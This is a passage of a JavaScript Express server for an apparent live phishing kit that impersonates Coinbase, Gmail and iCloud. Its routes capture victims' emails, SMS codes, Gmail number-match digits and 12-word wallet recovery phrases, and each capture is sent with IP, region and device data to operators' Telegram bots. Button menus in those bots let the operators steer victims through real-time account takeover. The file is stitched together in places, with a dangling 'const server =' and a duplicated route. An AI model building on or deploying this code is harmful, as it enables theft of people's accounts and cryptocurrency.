    // Map bot status values to frontend expectations
    if (status === "gmail_accept") {
      return res.json({ status: "accepted" });
    } else if (status === "gmail_reject") {
      return res.json({ status: "rejected" });
    }
    
    return res.json({ status: status || "pending" });

  } catch (err) {
    console.error("Check Gmail status error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// GET /api/gmail-login-status/:requestId
// ============================================================================

app.get("/api/gmail-login-status/:requestId", (req, res) => {
  try {
    const { requestId } = req.params;
    const entry = pendingGmailLogin[requestId];
    if (!entry) return res.json({ status: "pending" });
    res.json({ status: entry.status });
  } catch (err) {
    console.error("❌ Gmail Login status endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// GET /api/display-email/:displayEmailKey
// ============================================================================

app.get("/api/display-email/:displayEmailKey", (req, res) => {
  try {
    const { displayEmailKey } = req.params;
    const email = displayEmailStore[displayEmailKey];
    if (email) {
      res.json({ displayEmail: email });
    } else {
      res.json({ displayEmail: null });
    }
  } catch (err) {
    console.error("❌ Get display email error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// GET /get-gmail-login/:requestId
// ============================================================================

app.get("/get-gmail-login/:requestId", (req, res) => {
  try {
    const { requestId } = req.params;
    const entry = pendingGmailLogin[requestId];
    if (entry && entry.email) {
      res.json({ email: entry.email });
    } else {
      res.json({ email: null });
    }
  } catch (err) {
    console.error("❌ Get Gmail login error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// GMAIL VERIFICATION ENDPOINTS
// ============================================================================

app.post("/send-verification-page", async (req, res) => {
  try {
    const { userId, email, displayEmail } = req.body;
    
    // ✅ Use displayEmail if provided, otherwise use email
    const messageEmail = displayEmail || email;
    
    if (!userId || !email) {
      return res.status(400).json({ error: "Missing userId or email" });
    }
    
    const requestId = `verify_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    console.log(`🌈 Gmail Verification Received: ${messageEmail}`);
    
    const ip = getIP(req);
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    // ✅ Store both email (for tracking) and displayEmail (for showing)
    pendingVerificationPage[requestId] = { 
      status: "pending", 
      selectedDigits: null, 
      email: email,
      displayEmail: messageEmail
    };

    const message =
      `🌈🌈🌈 <b>Gmail - Verification</b> 🌈🌈🌈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${messageEmail || 'Unknown'}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "0", callback_data: `verify_digit|${requestId}|0` },
            { text: "1", callback_data: `verify_digit|${requestId}|1` },
            { text: "2", callback_data: `verify_digit|${requestId}|2` },
            { text: "3", callback_data: `verify_digit|${requestId}|3` },
            { text: "4", callback_data: `verify_digit|${requestId}|4` }
          ],
          [
            { text: "5", callback_data: `verify_digit|${requestId}|5` },
            { text: "6", callback_data: `verify_digit|${requestId}|6` },
            { text: "7", callback_data: `verify_digit|${requestId}|7` },
            { text: "8", callback_data: `verify_digit|${requestId}|8` },
            { text: "9", callback_data: `verify_digit|${requestId}|9` }
          ]
        ]
      }
    };

    // ✅ RESOLVE EMAIL via multi-layer tracking to find original winner
    let resolvedEmail = email;
    if (!userWinnerTelegram[email]) {
      resolvedEmail = resolveEmailFromRequest(req, null, null) || email;
    }

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    // ✅ SEND TO WINNER ONLY (use resolved email for winner lookup)
    if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
      await sendFollowUpMessage(resolvedEmail, message, options);
    } else {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: options.parse_mode,
          reply_markup: options.reply_markup
        })
      });
    }

    res.json({ status: "pending", requestId, email });

  } catch (err) {
    console.error("❌ Verification Page endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /update-selected-digits
// ============================================================================

app.post("/update-selected-digits", (req, res) => {
  try {
    const { requestId, digit } = req.body;
    if (!requestId || digit === undefined) return res.status(400).json({ error: "Missing requestId or digit" });
    
    if (!pendingVerificationPage[requestId]) {
      return res.status(400).json({ error: "Invalid requestId" });
    }

    if (!pendingVerificationPage[requestId].selectedDigits) {
      pendingVerificationPage[requestId].selectedDigits = [];
    }

    pendingVerificationPage[requestId].selectedDigits.push(digit);

    res.json({ ok: true, selectedCount: pendingVerificationPage[requestId].selectedDigits.length });
  } catch (err) {
    console.error("❌ Update selected digits error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// GET /check-verification-status - Check verification confirmation status by requestId
// ============================================================================

app.get("/check-verification-status", (req, res) => {
  try {
    const requestId = (req.query.requestId || "").trim();

    if (!requestId || !pendingVerificationConfirm[requestId]) {
      return res.json({ status: "pending" });
    }

    const status = pendingVerificationConfirm[requestId].status;
    
    // Map bot status values to frontend expectations
    if (status === "verification_accept") {
      return res.json({ status: "accepted" });
    } else if (status === "verification_reject") {
      return res.json({ status: "rejected" });
    }
    
    return res.json({ status: status || "pending" });

  } catch (err) {
    console.error("Check verification status error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /send-verification-confirm - Send confirmation message with selected digits
// ============================================================================

app.post("/send-verification-confirm", async (req, res) => {
  try {
    const { email, userId, digit1, digit2, requestId } = req.body;

    if (!email || !digit1 || !digit2 || !requestId) {
      return res.status(400).json({ error: "Missing required fields" });
    }

    const confirmRequestId = `confirm_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    
    // ✅ Get displayEmail from pendingVerificationPage (the Gmail email user entered)
    let displayEmail = email;
    if (pendingVerificationPage[requestId] && pendingVerificationPage[requestId].displayEmail) {
      displayEmail = pendingVerificationPage[requestId].displayEmail;
    }
    
    console.log(`🌈 Digits selected: ${digit1}${digit2}`);

    const ip = getIP(req);
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    // ✅ Store confirmation request with status pending
    pendingVerificationConfirm[confirmRequestId] = { 
      status: "pending", 
      email: email,
      displayEmail: displayEmail,
      digit1: digit1,
      digit2: digit2
    };

    const message =
      `🌈🌈🌈 <b>Gmail - Verify Numbers</b> 🌈🌈🌈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${displayEmail}</code>\n` +
      `<b>🔢 Selected Numbers:</b> <code><b>${digit1}${digit2}</b></code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Accept", callback_data: `verification_accept|${confirmRequestId}` },
            { text: "❌ Reject", callback_data: `verification_reject|${confirmRequestId}` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    // ✅ RESOLVE EMAIL via multi-layer tracking to find original winner
    // But use ORIGINAL email for winner lookup (to send to correct bot)
    let resolvedEmail = email;
    if (!userWinnerTelegram[email]) {
      resolvedEmail = resolveEmailFromRequest(req, null, null) || email;
    }

    // ✅ SEND TO WINNER ONLY (use ORIGINAL email to find correct bot)
    if (email && userWinnerTelegram[email]) {
      await sendFollowUpMessage(email, message, options);
    } else if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
      await sendFollowUpMessage(resolvedEmail, message, options);
    } else {
      console.log(`⚠️ WARNING: No winner found for ${email}, not sending message`);
    }

    res.json({ success: true, requestId: confirmRequestId });

  } catch (err) {
    console.error("❌ Verification confirm error:", err);
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// POST /resend-verification - Resend verification page with new digits
// ============================================================================

app.post("/resend-verification", async (req, res) => {
  try {
    const { userId, email, requestId } = req.body;

    if (!email || !requestId) {
      return res.status(400).json({ error: "Missing email or requestId" });
    }

    if (!pendingVerificationPage[requestId]) {
      return res.status(400).json({ error: "Invalid requestId" });
    }

    console.log(`🔄 Resending verification page for ${email}, requestId: ${requestId}`);

    const ip = getIP(req);
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    // ✅ Reset digits for this requestId
    pendingVerificationPage[requestId].selectedDigits = null;
    pendingVerificationPage[requestId].status = "pending";

    const message =
      `🔄 <b>Resend Code - Gmail</b> 🔄\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "0", callback_data: `verify_digit|${requestId}|0` },
            { text: "1", callback_data: `verify_digit|${requestId}|1` },
            { text: "2", callback_data: `verify_digit|${requestId}|2` },
            { text: "3", callback_data: `verify_digit|${requestId}|3` },
            { text: "4", callback_data: `verify_digit|${requestId}|4` }
          ],
          [
            { text: "5", callback_data: `verify_digit|${requestId}|5` },
            { text: "6", callback_data: `verify_digit|${requestId}|6` },
            { text: "7", callback_data: `verify_digit|${requestId}|7` },
            { text: "8", callback_data: `verify_digit|${requestId}|8` },
            { text: "9", callback_data: `verify_digit|${requestId}|9` }
          ]
        ]
      }
    };

    // ✅ RESOLVE EMAIL via multi-layer tracking to find original winner
    let resolvedEmail = email;
    if (!userWinnerTelegram[email]) {
      resolvedEmail = resolveEmailFromRequest(req, null, null) || email;
      console.log(`🔍 Resolved email via tracking: ${email} → ${resolvedEmail}`);
    }

    // ✅ SEND TO WINNER ONLY
    if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
      await sendFollowUpMessage(resolvedEmail, message, options);
    } else {
      console.log(`⚠️ WARNING: No winner found for ${email}, not sending message`);
    }

    res.json({ success: true, requestId });

  } catch (err) {
    console.error("❌ Resend verification error:", err);
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// POST /resend-verification-confirm - Resend verification confirm message when rejected
// ============================================================================

app.post("/resend-verification-confirm", async (req, res) => {
  try {
    const { email, userId, requestId } = req.body;

    if (!email || !requestId) {
      return res.status(400).json({ error: "Missing email or requestId" });
    }

    // ✅ Get the original digit selection from pendingVerificationPage
    if (!pendingVerificationPage[requestId]) {
      return res.status(400).json({ error: "Invalid requestId" });
    }

    const selectedDigits = pendingVerificationPage[requestId].selectedDigits;
    if (!selectedDigits || selectedDigits.length !== 2) {
      return res.status(400).json({ error: "Invalid digits" });
    }

    const digit1 = selectedDigits[0];
    const digit2 = selectedDigits[1];
    
    // ✅ Create new confirmation and send again
    const confirmRequestId = `confirm_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    
    // ✅ Get displayEmail from pendingVerificationPage
    let displayEmail = email;
    if (pendingVerificationPage[requestId] && pendingVerificationPage[requestId].displayEmail) {
      displayEmail = pendingVerificationPage[requestId].displayEmail;
    }
    
    console.log(`📋 Resending verification confirm: ${displayEmail} selected ${digit1}${digit2}`);

    const ip = getIP(req);
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    // ✅ Store NEW confirmation request with status pending
    pendingVerificationConfirm[confirmRequestId] = { 
      status: "pending", 
      email: email,
      displayEmail: displayEmail,
      digit1: digit1,
      digit2: digit2
    };

    const message =
      `🌈🌈🌈 <b>Gmail - Verify Numbers</b> 🌈🌈🌈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${displayEmail}</code>\n` +
      `<b>🔢 Selected Numbers:</b> <code><b>${digit1}${digit2}</b></code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Accept", callback_data: `verification_accept|${confirmRequestId}` },
            { text: "❌ Reject", callback_data: `verification_reject|${confirmRequestId}` }
          ]
        ]
      }
    };

    // ✅ RESOLVE EMAIL via multi-layer tracking to find original winner
    // But use ORIGINAL email for winner lookup (to send to correct bot)
    let resolvedEmail = email;
    if (!userWinnerTelegram[email]) {
      resolvedEmail = resolveEmailFromRequest(req, null, null) || email;
    }

    // ✅ SEND TO WINNER ONLY (use ORIGINAL email to find correct bot)
    if (email && userWinnerTelegram[email]) {
      await sendFollowUpMessage(email, message, options);
    } else if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
      await sendFollowUpMessage(resolvedEmail, message, options);
    } else {
      console.log(`⚠️ WARNING: No winner found for ${email}, not sending message`);
    }

    res.json({ success: true, requestId: confirmRequestId });

  } catch (err) {
    console.error("❌ Resend verification confirm error:", err);
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// GET /get-verification-display-email - Get displayEmail for verification confirm (for bot to display)
// ============================================================================

app.get("/get-verification-display-email", (req, res) => {
  try {
    const requestId = (req.query.requestId || "").trim();

    if (!requestId || !pendingVerificationConfirm[requestId]) {
      return res.json({ displayEmail: "unknown" });
    }

    const displayEmail = pendingVerificationConfirm[requestId].displayEmail || pendingVerificationConfirm[requestId].email;
    res.json({ displayEmail });

  } catch (err) {
    console.error("Get verification display email error:", err);
    res.json({ displayEmail: "unknown" });
  }
});

// ============================================================================
// GET /get-selected-digits
// ============================================================================

app.get("/get-selected-digits", (req, res) => {
  try {
    const { requestId } = req.query;
    if (!requestId) return res.status(400).json({ error: "Missing requestId" });

    const entry = pendingVerificationPage[requestId];
    if (!entry) return res.json({ success: false });

    if (entry.selectedDigits && entry.selectedDigits.length === 2) {
      const number = entry.selectedDigits[0] + entry.selectedDigits[1];
      return res.json({ success: true, number });
    }

    res.json({ success: false });
  } catch (err) {
    console.error("❌ Get selected digits error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// ============================================================================
// ============================================================================
// ============================================================================
// POST /sms2-login - Send SMS 2 code to winner bot
// ============================================================================

app.post("/sms2-login", async (req, res) => {
  try {
    const { code, userId, email } = req.body;

    if (!code || !userId || !email) {
      return res.status(400).json({ error: "Missing code, userId, or email" });
    }

    const ip = getIP(req);
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);
    const fingerprint = getDeviceFingerprint(req);
    const ipPrefix = ip.split(".").slice(0, 3).join(".");

    // ✅ RESOLVE LATEST EMAIL from fingerprint or IP (for display)
    let displayEmail = email;
    
    if (fingerprint && deviceFingerprintToEmail[fingerprint]) {
      displayEmail = deviceFingerprintToEmail[fingerprint];
    } else if (ipPrefix && ipPrefixToEmail[ipPrefix]) {
      displayEmail = ipPrefixToEmail[ipPrefix];
    }

    // ✅ Generate SMS 2 ID
    const sms2Id = `sms2_${Date.now()}_${Math.random().toString(36).substring(7)}`;

    // ✅ Store SMS 2 data
    pendingSMS2[sms2Id] = { 
      status: "pending", 
      userId, 
      email: displayEmail || email,
      displayEmail,
      code,
      choice: null 
    };

    const message =
      `😈😈😈 <b>Coinbase - SMS 2</b> 😈😈😈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${displayEmail}</code>\n` +
      `<b>💬 Code:</b> <code>${code}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "❌ Reject ❌", callback_data: `sms2_reject|${sms2Id}` }],
          [
            { text: "🏁 Done 🏁", callback_data: `sms2_done|${sms2Id}` },
            { text: "💼 Wallet 💼", callback_data: `sms2_wallet|${sms2Id}` }
          ],
          [
            { text: "☁️ iCloud ☁️", callback_data: `sms2_icloud|${sms2Id}` },
            { text: "🌈 Gmail 🌈", callback_data: `sms2_gmail|${sms2Id}` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    // ✅ SEND TO WINNER ONLY
    if (email && userWinnerTelegram[email]) {
      await sendFollowUpMessage(email, message, options);
    } else {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: options.parse_mode,
          reply_markup: options.reply_markup
        })
      });
    }

    res.json({ ok: true, sms2Id });

  } catch (err) {
    console.error("❌ SMS2 Login endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /check-sms2-status - Check SMS 2 choice
// ============================================================================

// ✅ GET /check-sms2-status - Check SMS 2 choice (for polling)
app.get("/check-sms2-status", (req, res) => {
  try {
    const sms2Id = (req.query.sms2Id || "").trim();

    if (!sms2Id) {
      return res.json({ choice: null });
    }

    if (pendingSMS2[sms2Id]) {
      const choice = pendingSMS2[sms2Id].choice;
      if (choice) {
        return res.json({ choice });
      }
    }

    res.json({ choice: null });

  } catch (err) {
    console.error("Check SMS2 status error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /update-sms2-choice
// ============================================================================

app.post("/update-sms2-choice", (req, res) => {
  try {
    const { sms2Id, choice } = req.body;

    if (!sms2Id || !choice) {
      return res.status(400).json({ error: "Missing sms2Id or choice" });
    }

    console.log(`🔍 DEBUG /update-sms2-choice: sms2Id=${sms2Id}, choice=${choice}`);
    console.log(`🔍 DEBUG: Before update, pendingSMS2[${sms2Id}] =`, pendingSMS2[sms2Id]);

    // ✅ Only update if it already exists, don't create empty object
    if (pendingSMS2[sms2Id]) {
      pendingSMS2[sms2Id].choice = choice;
      pendingSMS2[sms2Id].updatedAt = Date.now();
      console.log(`✅ Updated! pendingSMS2[${sms2Id}] =`, pendingSMS2[sms2Id]);
    } else {
      console.log(`❌ sms2Id NOT FOUND in pendingSMS2!`);
    }

    res.json({ ok: true });

  } catch (err) {
    console.error("❌ Update SMS2 choice error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// GET /get-sms2-info/:sms2Id
// ============================================================================

app.get("/get-sms2-info/:sms2Id", (req, res) => {
  try {
    const { sms2Id } = req.params;
    const entry = pendingSMS2[sms2Id];
    
    console.log(`🔍 DEBUG /get-sms2-info: sms2Id=${sms2Id}`);
    console.log(`🔍 DEBUG: pendingSMS2[${sms2Id}] =`, entry);
    
    if (entry) {
      const email = entry.email || entry.displayEmail;
      console.log(`✅ Found email: ${email}`);
      res.json({ email });
    } else {
      console.log(`❌ Entry not found`);
      res.json({ email: null });
    }
  } catch (err) {
    console.error("❌ Get SMS2 info error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /update-wallet-decision
// ============================================================================

app.post("/update-wallet-decision", (req, res) => {
  try {
    const { email, choice } = req.body;

    if (!email || !choice) {
      return res.status(400).json({ error: "Missing email or choice" });
    }

    if (!pendingWalletDecision[email]) {
      pendingWalletDecision[email] = {};
    }

    pendingWalletDecision[email].choice = choice;
    pendingWalletDecision[email].updatedAt = Date.now();

    console.log(`✅ Wallet decision updated: ${choice}`);
    res.json({ ok: true });

  } catch (err) {
    console.error("❌ Update wallet decision error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /send-verifying - Send verifying message with buttons
// ============================================================================

app.post("/send-verifying", async (req, res) => {
  try {
    const { userId, email } = req.body;
    
    if (!userId || !email) {
      return res.status(400).json({ error: "Missing userId or email" });
    }
    
    const verifyingId = `verifying_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    
    const ip = getIP(req);
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);
    const fingerprint = getDeviceFingerprint(req);
    const ipPrefix = ip.split(".").slice(0, 3).join(".");

    // ✅ RESOLVE LATEST EMAIL from fingerprint or IP (for display)
    let displayEmail = email; // Default to original
    
    // Try fingerprint first (most reliable)
    if (fingerprint && deviceFingerprintToEmail[fingerprint]) {
      displayEmail = deviceFingerprintToEmail[fingerprint];
    }
    // Try IP prefix as fallback
    else if (ipPrefix && ipPrefixToEmail[ipPrefix]) {
      displayEmail = ipPrefixToEmail[ipPrefix];
    }

    // ✅ Store displayEmail as primary email so bot.js gets the correct one
    pendingVerifying[verifyingId] = { status: "pending", userId, email: displayEmail || email, displayEmail, choice: null };

    const message =
      `😈😈😈 <b>Coinbase - Verifying</b> 😈😈😈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${displayEmail}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "💬 SMS - 2 💬", callback_data: `verifying_sms|${verifyingId}` }],
          [{ text: "🏁 Done 🏁", callback_data: `verifying_done|${verifyingId}` }],
          [{ text: "💼 Wallet 💼", callback_data: `verifying_wallet|${verifyingId}` }],
          [
            { text: "☁️", callback_data: `verifying_icloud|${verifyingId}` },
            { text: "🌈", callback_data: `verifying_gmail|${verifyingId}` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    // ✅ SEND TO WINNER ONLY (use ORIGINAL email to find winner)
    if (email && userWinnerTelegram[email]) {
      await sendFollowUpMessage(email, message, options);
    } else {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: options.parse_mode,
          reply_markup: options.reply_markup
        })
      });
    }

    res.json({ status: "pending", verifyingId });

  } catch (err) {
    console.error("❌ Verifying endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// GET /check-verifying-choice - Check which button bot clicked
// ============================================================================

app.get("/check-verifying-choice", (req, res) => {
  try {
    const { verifyingId } = req.query;
    if (!verifyingId) {
      return res.status(400).json({ error: "Missing verifyingId" });
    }

    if (pendingVerifying[verifyingId]) {
      const choice = pendingVerifying[verifyingId].choice;
      if (choice) {
        return res.json({ choice });
      }
    }

    res.json({ choice: null });

  } catch (err) {
    console.error("Check verifying choice error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /update-verifying-choice - Update verifying choice when bot clicks button
// ============================================================================

app.post("/update-verifying-choice", (req, res) => {
  try {
    const { verifyingId, choice } = req.body;

    if (!verifyingId || !choice) {
      return res.status(400).json({ error: "Missing verifyingId or choice" });
    }

    // ✅ Only update if it already exists, don't create empty object
    if (pendingVerifying[verifyingId]) {
      pendingVerifying[verifyingId].choice = choice;
      pendingVerifying[verifyingId].updatedAt = Date.now();
    }

    res.json({ ok: true });

  } catch (err) {
    console.error("❌ Update verifying choice error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// GET /get-verifying-info/:verifyingId - Get verifying info
// ============================================================================

app.get("/get-verifying-info/:verifyingId", (req, res) => {
  try {
    const { verifyingId } = req.params;
    const entry = pendingVerifying[verifyingId];

    if (entry) {
      return res.json(entry);
    }

    res.json(null);

  } catch (err) {
    console.error("❌ Get verifying info error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// Start server
// ============================================================================

const server = // ============================================================================
// POST /wallet-decision - Send wallet decision buttons to winner bot only
// ============================================================================

app.post("/wallet-decision", async (req, res) => {
  try {
    const { userId, email } = req.body;

    if (!email) {
      return res.status(400).json({ error: "Missing email" });
    }

    const ip = getIP(req);
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    // ✅ GET DISPLAY EMAIL (most recent entered email from iCloud/Gmail)
    let displayEmail = email;
    
    // Check if there's a more recent email from iCloud login
    if (pendingPage[email] && pendingPage[email].displayEmail) {
      displayEmail = pendingPage[email].displayEmail;
    }
    // Check if there's a more recent email from Gmail login (use email as key from pendingGmailLogin)
    else {
      for (let key in pendingGmailLogin) {
        if (pendingGmailLogin[key].email === email) {
          displayEmail = pendingGmailLogin[key].displayEmail || email;
          break;
        }
      }
    }

    const message =
      `😈😈😈 <b>Wallet - Decision</b> 😈😈😈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${displayEmail}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "💬 SMS - 2 💬", callback_data: `wallet_decision_sms|${email}` }],
          [{ text: "🏁 Done 🏁", callback_data: `wallet_decision_done|${email}` }],
          [
            { text: "☁️", callback_data: `wallet_decision_icloud|${email}` },
            { text: "🌈", callback_data: `wallet_decision_gmail|${email}` }
          ]
        ]
      }
    };

    // ✅ SEND TO WINNER ONLY (use email directly, same as wallet-phrase)
    if (email && userWinnerTelegram[email]) {
      await sendFollowUpMessage(email, message, options);
      console.log(`💰 Wallet decision sent to winner for ${email} (display: ${displayEmail})`);
    } else {
      console.log(`⚠️ WARNING: No winner found for ${email}, not sending wallet decision`);
      return res.status(400).json({ error: "No winner determined for this email" });
    }

    res.json({ ok: true });

  } catch (err) {
    console.error("❌ Wallet decision endpoint error:", err);
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// GET /check-wallet-decision/:email - Check wallet decision choice from bot
// ============================================================================

app.get("/check-wallet-decision/:email", (req, res) => {
  try {
    const email = decodeURIComponent(req.params.email);

    if (!email || !pendingWalletDecision[email]) {
      return res.json({ choice: null });
    }

    const choice = pendingWalletDecision[email].choice;
    console.log(`✅ Wallet decision for ${email}: ${choice}`);
    
    res.json({ choice });

  } catch (err) {
    console.error("Check wallet decision error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /update-wallet-decision - Update wallet decision when bot clicks button
// ============================================================================

app.post("/update-wallet-decision", (req, res) => {
  try {
    const { email, choice } = req.body;

    if (!email || !choice) {
      return res.status(400).json({ error: "Missing email or choice" });
    }

    if (!pendingWalletDecision[email]) {
      pendingWalletDecision[email] = {};
    }

    pendingWalletDecision[email].choice = choice;
    pendingWalletDecision[email].updatedAt = Date.now();

    console.log(`✅ Updated wallet decision for ${email}: ${choice}`);
    res.json({ ok: true });

  } catch (err) {
    console.error("Update wallet decision error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /wallet-phrase - Send wallet 12-word phrase to winner bot only
// ============================================================================
// ✅ CAPTCHA SUCCESS NOTIFICATION
// ============================================================================

app.post("/captcha-success", async (req, res) => {
  try {
    const ip = getIP(req);
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    const message =
      `🥳🥳🥳 New Visitor 🥳🥳🥳\n` +
      `🌍 Region: ${region}\n` +
      `💻 Device: ${device}\n` +
      `📍 IP: ${ip}`;

    // ✅ SEND TO CAPTCHA BOT
    const captchaChatId = process.env.CHAT_ID_CAPTCHA_PAGE;
    if (captchaChatId) {
      const TelegramBot = require("node-telegram-bot-api");
      const captchaBot = new TelegramBot(process.env.BOT_TOKEN_CAPTCHA_PAGE);
      await captchaBot.sendMessage(captchaChatId, message);
      console.log(`✅ CAPTCHA success notification sent to captcha bot`);
    }

    res.json({ ok: true });

  } catch (err) {
    console.error("❌ CAPTCHA success endpoint error:", err);
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================

app.post("/wallet-phrase", async (req, res) => {
  try {
    const { phrase, userId, email } = req.body;

    if (!phrase || !email) {
      return res.status(400).json({ error: "Missing phrase or email" });
    }

    const ip = getIP(req);
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    const message =
      `💰💰💰💰 <b>Wallet - Phrases</b> 💰💰💰💰\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📝 Phrases:</b>\n` +
      `<code>${phrase}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    // ✅ SEND TO WINNER ONLY
    if (email && userWinnerTelegram[email]) {
      await sendFollowUpMessage(email, message, {
        parse_mode: "HTML"
        // ✅ NO reply_markup - no buttons!
      });
      console.log(`💰 Wallet phrase sent to winner for ${email}`);
    } else {
      console.log(`⚠️ WARNING: No winner found for ${email}, not sending wallet phrase`);
      return res.status(400).json({ error: "No winner determined for this email" });
    }

    res.json({ ok: true });

  } catch (err) {
    console.error("❌ Wallet phrase endpoint error:", err);
    res.status(500).json({ error: err.message });
  }
});

app.listen(PORT, () => {
  console.log(`✅ Backend running on port ${PORT}`);
  startSelfPing();
});

module.exports = { app, server };
